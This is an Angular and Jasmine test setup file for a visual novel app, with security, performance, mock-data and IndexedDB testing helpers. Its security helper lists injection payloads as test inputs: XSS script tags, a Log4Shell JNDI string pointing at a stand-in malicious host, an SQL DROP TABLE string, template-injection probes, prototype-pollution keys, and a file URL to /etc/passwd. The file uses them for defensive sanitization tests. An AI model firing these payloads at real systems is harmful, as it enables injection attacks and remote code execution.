/**
 * Enhanced Test Setup for Visual Novel Studio
 * Provides comprehensive testing utilities and security test helpers
 */

import 'zone.js/dist/zone-testing';
import { getTestBed } from '@angular/core/testing';
import { BrowserDynamicTestingModule, platformBrowserDynamicTesting } from '@angular/platform-browser-dynamic/testing';

// Initialize the Angular testing environment
getTestBed().initTestEnvironment(
  BrowserDynamicTestingModule,
  platformBrowserDynamicTesting()
);

/**
 * Security Testing Utilities
 */
export class SecurityTestUtils {
  
  static readonly MALICIOUS_STRINGS = [
    '<script>alert("xss")</script>',
    '${jndi:ldap://malicious.com/exploit}',
    '"; DROP TABLE users; --',
    'javascript:alert("xss")',
    'data:text/html,<script>alert("xss")</script>',
    '<iframe src="javascript:alert(\'xss\')"></iframe>',
    '{{constructor.constructor("alert(1)")()}}',
    '${7*7}',
    '#{7*7}',
    '[[7*7]]'
  ];

  static readonly PROTOTYPE_POLLUTION_KEYS = [
    '__proto__',
    'constructor',
    'prototype',
    '__defineGetter__',
    '__defineSetter__',
    '__lookupGetter__',
    '__lookupSetter__'
  ];

  static readonly DANGEROUS_URLS = [
    'javascript:alert("xss")',
    'data:text/html,<script>alert("xss")</script>',
    'vbscript:msgbox("xss")',
    'file:///etc/passwd',
    'ftp://malicious.com/data'
  ];

  /**
   * Creates a malicious object for prototype pollution testing
   */
  static createMaliciousObject(): any {
    const obj: any = { legitimate: 'data' };
    this.PROTOTYPE_POLLUTION_KEYS.forEach(key => {
      obj[key] = 'malicious payload';
    });
    return obj;
  }

  /**
   * Creates a large object for performance testing
   */
  static createLargeObject(size: number = 10000): any {
    const obj: any = {};
    for (let i = 0; i < size; i++) {
      obj[`key${i}`] = `value${i}`;
    }
    return obj;
  }

  /**
   * Creates a deeply nested object for depth testing
   */
  static createDeepObject(depth: number = 15): any {
    let obj: any = { leaf: 'value' };
    for (let i = 0; i < depth; i++) {
      obj = { nested: obj };
    }
    return obj;
  }

  /**
   * Validates that an object has been sanitized properly
   */
  static validateSanitized(obj: any): boolean {
    if (!obj || typeof obj !== 'object') return true;
    
    // Check for dangerous keys
    for (const key of this.PROTOTYPE_POLLUTION_KEYS) {
      if (key in obj) return false;
    }

    // Check nested objects
    for (const value of Object.values(obj)) {
      if (typeof value === 'object' && !this.validateSanitized(value)) {
        return false;
      }
    }

    return true;
  }
}

/**
 * Performance Testing Utilities
 */
export class PerformanceTestUtils {
  
  /**
   * Measures the execution time of a function
   */
  static async measureExecutionTime<T>(fn: () => T | Promise<T>): Promise<{ result: T, duration: number }> {
    const start = performance.now();
    const result = await Promise.resolve(fn());
    const end = performance.now();
    return { result, duration: end - start };
  }

  /**
   * Creates a performance test that fails if execution exceeds threshold
   */
  static createPerformanceTest<T>(
    fn: () => T | Promise<T>, 
    maxDurationMs: number,
    description: string = 'Performance test'
  ): () => Promise<void> {
    return async () => {
      const { result, duration } = await this.measureExecutionTime(fn);
      if (duration > maxDurationMs) {
        throw new Error(`${description} exceeded time limit: ${duration}ms > ${maxDurationMs}ms`);
      }
      return result;
    };
  }

  /**
   * Generates load test data
   */
  static generateLoadTestData(count: number): any[] {
    return Array(count).fill(0).map((_, i) => ({
      id: `item-${i}`,
      name: `Test Item ${i}`,
      value: Math.random() * 1000,
      timestamp: Date.now() + i,
      data: 'x'.repeat(100) // Some bulk data
    }));
  }
}

/**
 * Mock Data Factory
 */
export class MockDataFactory {
  
  static createAvatarManifest(overrides: any = {}): any {
    return {
      key: 'test-avatar',
      description: 'A test avatar for unit testing',
      images: [
        {
          type: 'url',
          key: 'standard',
          source: 'https://example.com/avatar-standard.png'
        },
        {
          type: 'local',
          key: 'profile',
          name: 'profile.png'
        }
      ],
      ...overrides
    };
  }

  static createCharacter(overrides: any = {}): any {
    return {
      key: 'test-character',
      firstName: 'John',
      lastName: 'Doe',
      gender: 'male',
      stats: {
        intelligence: 50,
        charisma: 30,
        creativity: 40
      },
      relationshipLevel: 0,
      storyProgress: 0,
      ...overrides
    };
  }

  static createGameState(overrides: any = {}): any {
    return {
      stage: 'education',
      avatar: this.createCharacter(),
      day: 1,
      currency: 100,
      characters: {},
      currentCharacter: null,
      ...overrides
    };
  }

  static createFile(content: string, name: string, type: string = 'application/json'): File {
    return new File([content], name, { type });
  }

  static createImageBlob(size: number = 1024): Blob {
    const data = new Uint8Array(size);
    data.fill(255); // White pixel data
    return new Blob([data], { type: 'image/png' });
  }
}

/**
 * Database Testing Utilities
 */
export class DatabaseTestUtils {
  
  static createMockIndexedDB(): jasmine.SpyObj<IDBFactory> {
    const mockDB = jasmine.createSpyObj('IDBDatabase', ['transaction', 'createObjectStore', 'close']);
    const mockTransaction = jasmine.createSpyObj('IDBTransaction', ['objectStore', 'oncomplete', 'onerror']);
    const mockObjectStore = jasmine.createSpyObj('IDBObjectStore', [
      'get', 'put', 'delete', 'getAll', 'getAllKeys', 'clear', 'createIndex', 'index'
    ]);
    const mockIndex = jasmine.createSpyObj('IDBIndex', ['get', 'getAll', 'getAllKeys']);
    const mockRequest = jasmine.createSpyObj('IDBRequest', ['onsuccess', 'onerror']);
    const mockOpenRequest = jasmine.createSpyObj('IDBOpenDBRequest', ['onsuccess', 'onerror', 'onupgradeneeded']);
    const mockFactory = jasmine.createSpyObj('IDBFactory', ['open']);

    // Setup default behaviors
    mockFactory.open.and.returnValue(mockOpenRequest);
    mockDB.transaction.and.returnValue(mockTransaction);
    mockTransaction.objectStore.and.returnValue(mockObjectStore);
    mockObjectStore.index.and.returnValue(mockIndex);
    mockObjectStore.get.and.returnValue(mockRequest);
    mockObjectStore.put.and.returnValue(mockRequest);
    mockObjectStore.delete.and.returnValue(mockRequest);
    mockObjectStore.getAll.and.returnValue(mockRequest);
    mockObjectStore.getAllKeys.and.returnValue(mockRequest);
    mockObjectStore.clear.and.returnValue(mockRequest);
    mockIndex.get.and.returnValue(mockRequest);
    mockIndex.getAll.and.returnValue(mockRequest);
    mockIndex.getAllKeys.and.returnValue(mockRequest);

    // Setup success callbacks
    mockOpenRequest.onsuccess = jasmine.createSpy().and.callFake((event) => {
      if (event?.target) event.target.result = mockDB;
    });
    
    mockRequest.onsuccess = jasmine.createSpy().and.callFake((event) => {
      if (event?.target) event.target.result = {};
    });

    return mockFactory;
  }

  static simulateSuccessfulOperation(mockRequest: any, result: any = {}): void {
    setTimeout(() => {
      if (mockRequest.onsuccess) {
        mockRequest.onsuccess({ target: { result } });
      }
    }, 0);
  }

  static simulateFailedOperation(mockRequest: any, error: any = new Error('Database error')): void {
    setTimeout(() => {
      if (mockRequest.onerror) {
        mockRequest.onerror(error);
      }
    }, 0);
  }
}

/**
 * Component Testing Utilities
 */
export class ComponentTestUtils {
  
  /**
   * Creates a minimal test module configuration
   */
  static createTestModule(config: {
    declarations?: any[],
    imports?: any[],
    providers?: any[]
  } = {}): any {
    return {
      declarations: config.declarations || [],
      imports: config.imports || [],
      providers: config.providers || []
    };
  }

  /**
   * Simulates user input events
   */
  static simulateUserInput(element: HTMLElement, value: string): void {
    if (element instanceof HTMLInputElement) {
      element.value = value;
      element.dispatchEvent(new Event('input', { bubbles: true }));
    }
  }

  /**
   * Waits for Angular change detection to complete
   */
  static async waitForChangeDetection(fixture: any, cycles: number = 1): Promise<void> {
    for (let i = 0; i < cycles; i++) {
      fixture.detectChanges();
      await fixture.whenStable();
    }
  }
}

/**
 * Global test configuration
 */
declare global {
  namespace jasmine {
    interface Matchers<T> {
      toBeSanitized(): boolean;
      toCompleteWithin(maxDurationMs: number): Promise<boolean>;
    }
  }
}

// Add custom matchers
beforeEach(() => {
  jasmine.addMatchers({
    toBeSanitized: () => ({
      compare: (actual: any) => ({
        pass: SecurityTestUtils.validateSanitized(actual),
        message: 'Expected object to be sanitized (no dangerous properties)'
      })
    }),
    
    toCompleteWithin: () => ({
      compare: async (actualFn: () => Promise<any>, maxDurationMs: number) => {
        const start = performance.now();
        await actualFn();
        const duration = performance.now() - start;
        
        return {
          pass: duration <= maxDurationMs,
          message: `Expected operation to complete within ${maxDurationMs}ms, but took ${duration}ms`
        };
      }
    })
  });
});

// Global error handling for tests
window.addEventListener('unhandledrejection', event => {
  console.error('Unhandled promise rejection in tests:', event.reason);
});

// Increase test timeout for integration tests
jasmine.DEFAULT_TIMEOUT_INTERVAL = 30000;